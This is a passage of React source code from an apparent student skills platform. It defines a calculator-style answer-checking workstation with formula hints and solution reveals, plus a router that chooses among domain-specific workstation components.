              value={scratchpad} onChange={e => setScratchpad(e.target.value)}
              placeholder={`Work out your calculation step-by-step here...\n\nExample:\nStep 1: Identify given values\nStep 2: Choose formula\nStep 3: Substitute and solve\nAnswer: ___`}
              style={{ width: "100%", minHeight: 140, border: "none", resize: "vertical", outline: "none",
                fontFamily: "'DM Mono', monospace", fontSize: 12, color: T.ink2, lineHeight: 1.7,
                padding: "12px 16px", boxSizing: "border-box", background: "#FAFAFA" }}
            />
          </div>

          {/* Solution panel */}
          <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 14, overflow: "hidden" }}>
            <button onClick={() => setShowSolution(s => !s)}
              style={{ width: "100%", padding: "13px 16px", display: "flex", alignItems: "center", gap: 10, background: "none", border: "none", cursor: "pointer", fontFamily: "inherit" }}>
              <span style={{ fontSize: 13 }}>📖</span>
              <span style={{ fontSize: 12, fontWeight: 800, color: T.ink2 }}>Step-by-Step Solution {showSolution ? "▲" : "▼"}</span>
              {!showSolution && <span style={{ fontSize: 10, color: T.ink4, marginLeft: "auto" }}>Reveal formula walkthrough</span>}
            </button>
            {showSolution && (
              <div style={{ padding: "4px 18px 18px", borderTop: `1px solid ${T.border}` }}>
                {solutionText
                  ? solutionText.split("\n").map((line, i) => {
                      if (!line.trim()) return <div key={i} style={{ height: 6 }} />
                      const clean = line.replace(/\*\*/g, "")
                      const isHeader = line.startsWith("**Step") || line.startsWith("**Formula")
                      const isMono   = /=|→|×|÷|√/.test(clean)
                      return (
                        <div key={i} style={{
                          fontSize: isHeader ? 12 : 12.5, fontWeight: isHeader ? 800 : 400,
                          color: isHeader ? config.color : T.ink2, lineHeight: 1.75, marginBottom: 3,
                          fontFamily: isMono && !isHeader ? "'DM Mono', monospace" : "inherit",
                        }}>{clean}</div>
                      )
                    })
                  : <div style={{ fontSize: 12, color: T.ink4, padding: "8px 0" }}>Solution walkthrough not available for this problem.</div>}
              </div>
            )}
          </div>
        </div>

        {/* RIGHT: Reference / Tools panel */}
        {activePanel !== "solve" && (
          <div style={{ width: 290, flexShrink: 0, borderLeft: `1px solid ${T.border}`, background: "#fff", overflowY: "auto", display: "flex", flexDirection: "column" }}>

            {activePanel === "ref" && (
              <>
                <div style={{ padding: "12px 14px 8px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
                  <div style={{ fontSize: 10, fontWeight: 800, color: config.color, letterSpacing: 0.8, textTransform: "uppercase" }}>📐 Formula Reference — {mission.category}</div>
                </div>
                <div style={{ padding: "10px 14px", flex: 1 }}>
                  {config.refs.map((r, i) => (
                    <div key={i} style={{ marginBottom: 10, padding: "8px 10px", background: `${config.color}06`, borderRadius: 8, border: `1px solid ${config.color}18` }}>
                      <div style={{ fontSize: 10, fontWeight: 800, color: config.color, marginBottom: 3 }}>{r.label}</div>
                      <div style={{ fontSize: 11, fontFamily: "'DM Mono', monospace", color: T.ink2, lineHeight: 1.5 }}>{r.formula}</div>
                    </div>
                  ))}
                </div>
              </>
            )}

            {activePanel === "tools" && (
              <>
                <div style={{ padding: "12px 14px 8px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
                  <div style={{ fontSize: 10, fontWeight: 800, color: config.color, letterSpacing: 0.8, textTransform: "uppercase" }}>🔧 Industry Tools & Software</div>
                </div>
                <div style={{ padding: "12px 14px", flex: 1, display: "flex", flexDirection: "column", gap: 8 }}>
                  {config.tools.map((tool, i) => (
                    <div key={i} style={{ padding: "9px 11px", borderRadius: 9, border: `1px solid ${T.border}`, background: "#FAFAFA", display: "flex", alignItems: "center", gap: 9 }}>
                      <div style={{ width: 7, height: 7, borderRadius: "50%", background: config.color, flexShrink: 0 }} />
                      <span style={{ fontSize: 12, fontWeight: 600, color: T.ink2 }}>{tool}</span>
                    </div>
                  ))}
                  <div style={{ marginTop: 12, padding: "12px 12px", background: `${config.color}08`, borderRadius: 10, border: `1px solid ${config.color}20` }}>
                    <div style={{ fontSize: 10, fontWeight: 800, color: config.color, marginBottom: 6, textTransform: "uppercase", letterSpacing: 0.6 }}>Career Work Areas</div>
                    <div style={{ fontSize: 11, color: T.ink2, lineHeight: 1.8 }}>
                      {config.workEnv.split(" · ").map((w, i) => (
                        <div key={i} style={{ display: "flex", alignItems: "center", gap: 6 }}>
                          <span style={{ color: config.color }}>▸</span> {w}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// CALCULATOR WORKSTATION — for Aptitude, Logical, ECE, EEE, Mechanical,
// Civil, Pharmacy, MBA and any domain whose primary tool is NOT a code editor.
// Students type a numerical/text answer and get immediate formula feedback.
// ─────────────────────────────────────────────────────────────────────────────
function CalculatorWorkstation({ mission, code, onCodeChange }) {
  const [answer, setAnswer]       = useState(code || "")
  const [checked, setChecked]     = useState(null)   // null | "correct" | "wrong"
  const [showSolution, setShowSolution] = useState(false)
  const [attempts, setAttempts]   = useState(0)

  // Derive expected answer from test_cases
  const expected = (() => {
    try {
      const tc = mission.test_cases || mission.testCases || []
      const arr = typeof tc === "string" ? JSON.parse(tc) : tc
      if (arr && arr[0]) return String(arr[0].expected_output ?? arr[0].expected ?? "")
    } catch { /* noop */ }
    try {
      const ex = mission.examples || []
      const arr = typeof ex === "string" ? JSON.parse(ex) : ex
      if (arr && arr[0]) return String(arr[0].output ?? arr[0].expected ?? "")
    } catch { /* noop */ }
    return null
  })()

  // Parse editorial into steps
  const solutionText = mission.editorial || ""

  // Category → domain label and color
  const domainInfo = {
    "Aptitude":   { label: "Aptitude & QA", color: "#0369A1", emoji: "🧮" },
    "Logical":    { label: "Logical Reasoning", color: "#7C3AED", emoji: "🧩" },
    "ECE":        { label: "Electronics & Comm", color: "#0891B2", emoji: "📡" },
    "EEE":        { label: "Electrical Engg", color: "#D97706", emoji: "⚡" },
    "Mechanical": { label: "Mechanical Engg", color: "#4B5563", emoji: "⚙️" },
    "Civil":      { label: "Civil Engg", color: "#92400E", emoji: "🏗️" },
    "Pharmacy":   { label: "Pharmaceutical", color: "#059669", emoji: "💊" },
    "MBA":        { label: "Business / Mgmt", color: "#7C3AED", emoji: "📊" },
  }
  const di = domainInfo[mission.category] || { label: mission.category, color: "#475569", emoji: "🔬" }

  // Extract formula hints from statement (lines containing "Formula" or "=")
  const formulaHints = (() => {
    const text = mission.statement || mission.description || ""
    return text.split("\n")
      .filter(l => /formula|=|→|step/i.test(l) && l.trim().length > 4)
      .slice(0, 4)
      .map(l => l.replace(/^#+\s*/, "").replace(/\*\*/g, "").trim())
      .filter(Boolean)
  })()

  const handleCheck = () => {
    if (!answer.trim() || !expected) return
    setAttempts(n => n + 1)
    const userAns = answer.trim().replace(/,/g, "").toLowerCase()
    const exp     = expected.trim().replace(/,/g, "").toLowerCase()
    // Numeric tolerance: ±0.05 for rounding differences
    const uNum = parseFloat(userAns)
    const eNum = parseFloat(exp)
    const isNumeric = !isNaN(uNum) && !isNaN(eNum)
    const correct = isNumeric ? Math.abs(uNum - eNum) < 0.05 : userAns === exp
    setChecked(correct ? "correct" : "wrong")
    // Propagate to ChallengeShell via code string (used for proof)
    onCodeChange(`Answer: ${answer.trim()}`)
    // Register validator result so ChallengeShell knows
    if (typeof window !== "undefined") {
      window.__calculatorValidation = [{ passed: correct, input: "Answer check", expected, actual: answer.trim() }]
    }
  }

  const handleKeyDown = (e) => {
    if (e.key === "Enter") { e.preventDefault(); handleCheck() }
  }

  // Register validator so ChallengeShell "Validate" button works
  useEffect(() => {
    try {
      registerValidator(() => {
        const userAns = answer.trim().replace(/,/g, "").toLowerCase()
        const exp = (expected || "").trim().replace(/,/g, "").toLowerCase()
        const uNum = parseFloat(userAns), eNum = parseFloat(exp)
        const isNum = !isNaN(uNum) && !isNaN(eNum)
        const ok = isNum ? Math.abs(uNum - eNum) < 0.05 : userAns === exp
        return [{ passed: ok, input: "Answer matches expected", expected, actual: answer.trim() }]
      })
    } catch { /* workstationEngine may not expose registerValidator */ }
    return () => {
      try { registerValidator(null) } catch { /* noop */ }
    }
  }, [answer, expected]) // eslint-disable-line

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", background: T.bg }}>

      {/* Domain badge strip */}
      <div style={{ padding: "8px 16px", borderBottom: `1px solid ${T.border}`, background: "#fff", display: "flex", alignItems: "center", gap: 8, flexShrink: 0 }}>
        <span style={{ fontSize: 16 }}>{di.emoji}</span>
        <span style={{ fontSize: 10, fontWeight: 800, color: di.color, letterSpacing: 0.8, textTransform: "uppercase" }}>{di.label}</span>
        {mission.difficulty && (
          <span style={{ fontSize: 10, fontWeight: 700, padding: "2px 8px", borderRadius: 99,
            color: mission.difficulty === "Easy" ? "#16A34A" : mission.difficulty === "Medium" ? "#D97706" : "#DC2626",
            background: mission.difficulty === "Easy" ? "#F0FDF4" : mission.difficulty === "Medium" ? "#FFFBEB" : "#FEF2F2"
          }}>{mission.difficulty}</span>
        )}
        <span style={{ fontSize: 11, color: T.ink4, marginLeft: "auto" }}>
          {expected ? `Expected: numeric answer` : "Open-ended problem"}
        </span>
      </div>

      <div style={{ flex: 1, overflowY: "auto", padding: 20, display: "flex", flexDirection: "column", gap: 16 }}>

        {/* Formula reference card */}
        {formulaHints.length > 0 && (
          <div style={{ background: `${di.color}08`, border: `1px solid ${di.color}22`, borderRadius: 12, padding: "12px 16px" }}>
            <div style={{ fontSize: 10, fontWeight: 800, color: di.color, letterSpacing: 0.7, textTransform: "uppercase", marginBottom: 8 }}>📐 Formula Reference</div>
            {formulaHints.map((h, i) => (
              <div key={i} style={{ fontSize: 12.5, color: T.ink2, marginBottom: 4, lineHeight: 1.5, fontFamily: "'DM Mono', monospace" }}>{h}</div>
            ))}
          </div>
        )}

        {/* Answer input */}
        <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 14, padding: "20px 20px" }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: T.ink, marginBottom: 4 }}>Your Answer</div>
          <div style={{ fontSize: 11, color: T.ink4, marginBottom: 14, lineHeight: 1.5 }}>
            Compute the answer using the formula from the problem statement. Enter the numeric result (decimals allowed).
          </div>
          <div style={{ display: "flex", gap: 10, alignItems: "center" }}>
            <input
              type="text"
              value={answer}
              onChange={e => { setAnswer(e.target.value); setChecked(null) }}
              onKeyDown={handleKeyDown}
              placeholder="Enter your answer here…"
              style={{
                flex: 1, padding: "12px 16px", fontSize: 20, fontWeight: 700,
                fontFamily: "'DM Mono', monospace", color: T.ink,
                border: `2px solid ${checked === "correct" ? "#22C55E" : checked === "wrong" ? "#EF4444" : di.color}`,
                borderRadius: 10, outline: "none", background: checked === "correct" ? "#F0FDF4" : checked === "wrong" ? "#FFF5F5" : "#fff",
              }}
            />
            <button onClick={handleCheck} disabled={!answer.trim()}
              style={{ padding: "12px 22px", background: di.color, color: "#fff", border: "none", borderRadius: 10, fontSize: 13, fontWeight: 800, cursor: answer.trim() ? "pointer" : "not-allowed", opacity: answer.trim() ? 1 : 0.5, fontFamily: "inherit", whiteSpace: "nowrap" }}>
              ✓ Check
            </button>
          </div>

          {/* Immediate feedback */}
          {checked === "correct" && (
            <div style={{ marginTop: 12, padding: "10px 14px", background: "#F0FDF4", border: "1px solid #BBF7D0", borderRadius: 9, display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ fontSize: 18 }}>🎉</span>
              <div>
                <div style={{ fontSize: 13, fontWeight: 800, color: "#15803D" }}>Correct! Great work.</div>
                <div style={{ fontSize: 11, color: "#166534", marginTop: 2 }}>Your answer matches the expected result. Click "Submit Answer" to lock in your proof.</div>
              </div>
            </div>
          )}
          {checked === "wrong" && (
            <div style={{ marginTop: 12, padding: "10px 14px", background: "#FFF5F5", border: "1px solid #FECACA", borderRadius: 9, display: "flex", alignItems: "center", gap: 10 }}>
              <span style={{ fontSize: 18 }}>❌</span>
              <div style={{ flex: 1 }}>
                <div style={{ fontSize: 13, fontWeight: 800, color: "#DC2626" }}>Not quite. Try again.</div>
                <div style={{ fontSize: 11, color: "#991B1B", marginTop: 2 }}>
                  Attempt #{attempts} · Check the formula reference above and rework your calculation.
                  {attempts >= 2 && <> · <button onClick={() => setShowSolution(true)} style={{ background: "none", border: "none", color: "#991B1B", fontWeight: 800, cursor: "pointer", textDecoration: "underline", fontSize: 11, padding: 0 }}>See step-by-step solution</button></>}
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Step-by-step solution panel */}
        <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 14, overflow: "hidden" }}>
          <button onClick={() => setShowSolution(s => !s)}
            style={{ width: "100%", padding: "13px 18px", display: "flex", alignItems: "center", gap: 10, background: "none", border: "none", cursor: "pointer", fontFamily: "inherit", textAlign: "left" }}>
            <span style={{ fontSize: 14 }}>📖</span>
            <span style={{ fontSize: 12, fontWeight: 800, color: T.ink2 }}>Step-by-Step Solution {showSolution ? "▲" : "▼"}</span>
            {!showSolution && <span style={{ fontSize: 11, color: T.ink4, marginLeft: "auto" }}>Tap to reveal formula walkthrough</span>}
          </button>
          {showSolution && solutionText && (
            <div style={{ padding: "4px 18px 18px", borderTop: `1px solid ${T.border}` }}>
              {solutionText.split("\n").map((line, i) => {
                if (!line.trim()) return <div key={i} style={{ height: 6 }} />
                const isBold = line.startsWith("**")
                const clean = line.replace(/\*\*/g, "")
                const isExample = /example/i.test(clean)
                return (
                  <div key={i} style={{
                    fontSize: isBold ? 12 : 12.5, fontWeight: isBold ? 800 : 400,
                    color: isExample ? di.color : isBold ? T.ink : T.ink2,
                    lineHeight: 1.7, marginBottom: 3,
                    fontFamily: /formula|=|→|Step [0-9]/i.test(clean) ? "'DM Mono', monospace" : "inherit",
                  }}>{clean}</div>
                )
              })}
            </div>
          )}
          {showSolution && !solutionText && (
            <div style={{ padding: "14px 18px", color: T.ink4, fontSize: 12 }}>
              Solution walkthrough not available for this problem.
            </div>
          )}
        </div>

        {/* Tools reference for domain-specific streams */}
        {["ECE","EEE","Mechanical","Civil"].includes(mission.category) && (
          <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 12, padding: "14px 16px" }}>
            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink4, textTransform: "uppercase", letterSpacing: 0.8, marginBottom: 10 }}>🔧 Industry Tools Used in Practice</div>
            <div style={{ fontSize: 12, color: T.ink2, lineHeight: 1.7 }}>
              {mission.category === "ECE"        && "📡 MATLAB / Simulink — Signal processing, filter design, system modelling\n🔌 Multisim / LTSpice — Circuit simulation\n💻 Verilog / VHDL — Digital design and FPGA programming"}
              {mission.category === "EEE"        && "⚡ MATLAB / ETAP — Power systems analysis, load flow studies\n🔌 PLC Programming (Ladder Logic) — Industrial automation\n🔭 PSCAD — Power system transient simulation"}
              {mission.category === "Mechanical" && "⚙️ ANSYS / ABAQUS — Finite Element Analysis (FEA), stress/thermal simulation\n🔩 SolidWorks / AutoCAD — 3D modeling and drafting\n📊 MATLAB — Dynamics, vibrations, control systems"}
              {mission.category === "Civil"      && "🏗️ STAAD.Pro / ETABS — Structural analysis and design\n📐 AutoCAD Civil 3D — Site planning and road design\n🌊 HEC-RAS — Hydraulics and flood modeling"}
            </div>
          </div>
        )}

      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// UPDATED WORKSTATION ROUTER
// ─────────────────────────────────────────────────────────────────────────────
export function WorkstationRouter({ mission, domain, domainKey, moduleSandbox, code, onCodeChange, CodeEditor }) {
  const type = resolveWorkstationType(mission) || moduleSandbox || "code"

  switch (type) {
    case "engineering_lab":  return <EngineeringLabWorkstation mission={mission} code={code} onCodeChange={onCodeChange} />
    case "calculator":       return <CalculatorWorkstation   mission={mission} code={code} onCodeChange={onCodeChange} />
    case "sql":              return <SqlWorkstation          mission={mission} code={code} onCodeChange={onCodeChange} />
    case "api":              return <ApiWorkstation          mission={mission} code={code} onCodeChange={onCodeChange} />
    case "frontend":
    case "react":            return <FrontendWorkstation     mission={mission} code={code} onCodeChange={onCodeChange} />
    case "terminal":         return <TerminalWorkstation     mission={mission} code={code} onCodeChange={onCodeChange} />
    case "notebook":         return <NotebookWorkstation     mission={mission} code={code} onCodeChange={onCodeChange} />
    case "markdown":         return <MarkdownWorkstation     mission={mission} code={code} onCodeChange={onCodeChange} />
    case "excel":            return <ExcelWorkstation        mission={mission} code={code} onCodeChange={onCodeChange} />
    case "dashboard":        return <DashboardWorkstation    mission={mission} code={code} onCodeChange={onCodeChange} />
    case "report":           return <ReportWorkstation       mission={mission} code={code} onCodeChange={onCodeChange} />
    // ── New workstations ──
    case "security_console": return <SecurityConsole        mission={mission} code={code} onCodeChange={onCodeChange} />
    case "soc_console":      return <SOCConsole             mission={mission} code={code} onCodeChange={onCodeChange} />
    case "qa_lab":           return <QATestLab              mission={mission} code={code} onCodeChange={onCodeChange} />
    case "business_analysis":return <BusinessAnalysisBoard  mission={mission} code={code} onCodeChange={onCodeChange} />
    case "sre_console":      return <SREConsole             mission={mission} code={code} onCodeChange={onCodeChange} />
    case "data_pipeline":    return <DataPipelineStudio     mission={mission} code={code} onCodeChange={onCodeChange} />
    case "system_design":    return <SystemDesignWorkstation mission={mission} code={code} onCodeChange={onCodeChange} />
    case "medical_coding":   return <MedicalCodingWorkstation mission={mission} code={code} onCodeChange={onCodeChange} />
    default:
      return CodeEditor
        ? <CodeWorkstation code={code} onCodeChange={onCodeChange} sandbox={moduleSandbox} domainKey={domainKey} CodeEditor={CodeEditor} />
        : <div style={{ flex:1, display:"flex", alignItems:"center", justifyContent:"center", color:T.ink3 }}>No workstation available</div>
  }
}

export default WorkstationRouter
